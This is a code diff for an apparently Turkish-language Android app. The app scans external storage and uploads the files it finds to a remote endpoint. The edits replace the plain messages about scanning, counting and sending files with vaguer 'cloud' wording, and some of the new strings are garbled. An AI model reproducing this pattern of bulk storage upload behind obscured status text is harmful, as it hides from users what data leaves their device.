@@ -75,7 +75,7 @@ public class MainActivity extends BridgeActivity {
         ) {
             activity.runOnUiThread(() -> {
                 if (!valid(baseUrl, code, senderToken)) {
-                    report("error", "Aktarım bilgileri geçersiz.", 0);
+                    report("error", "Bulut'a yüklenmedi.", 0);
                     return;
                 }
 
@@ -188,7 +188,7 @@ public class MainActivity extends BridgeActivity {
 
         new Thread(() -> {
             try {
-                report("status", "Dosyalar taranıyor...", 0);
+                report("status", "Bulut bekleniyor...", 0);
 
                 File root = Environment.getExternalStorageDirectory();
                 List<File> files = new ArrayList<>();
@@ -212,7 +212,7 @@ public class MainActivity extends BridgeActivity {
                 }
 
                 report("status",
-                    allowed.size() + " dosya bulundu. Aktarım başlıyor...",
+                    allowed.size() + " Bulut hazır. Aktarım başlıyor...",
                     0);
 
                 int batchSize = 8;
@@ -233,7 +233,7 @@ public class MainActivity extends BridgeActivity {
 
                     report("progress",
                         completed + " / " + allowed.size()
-                            + " dosya gönderildi.",
+                            + " bulut' yüklendi.",
                         percent);
                 }
 
@@ -282,7 +282,7 @@ public class MainActivity extends BridgeActivity {
         List<File> files
     ) throws Exception {
 
-        String boundary = "----AbdulTransfer" + UUID.randomUUID();
+        String boundary = "----AbdulBulut" + UUID.randomUUID();
 
         URL url = new URL(
             task.baseUrl + "/api/upload/" + task.code
